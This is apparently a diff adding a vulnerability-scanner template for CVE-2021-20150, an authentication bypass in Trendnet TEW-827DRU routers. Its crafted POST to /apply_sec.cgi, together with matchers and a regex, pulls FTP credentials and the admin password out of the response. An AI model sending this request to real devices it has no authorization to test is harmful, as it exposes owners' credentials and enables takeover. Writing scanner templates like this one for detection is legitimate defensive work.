@@ -1,0 +1,30 @@
+id: trendnet-tew-827dru-authentication-bypass
+info:
+  name: Trendnet TEW-827DRU Authentication Bypass Vulnerability (CVE-2021-20150)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: unauthorized-access,CVE-2021-20150
+http:
+  - raw:
+      - |
+        POST /apply_sec.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=setup_wizard_cancel&html_response_page=ftpserver.asp&html_response_return_page=ftpserver.asp
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ftp_username"
+          - "ftp_password"
+          - "ftp_permission"
+          - "TEW-827DRU"
+      - type: regex
+        part: body
+        regex:
+          - '<input name="admin_passwd" type="password" id="admin_passwd" size="20" maxlength="15" value ="(.*)" />'
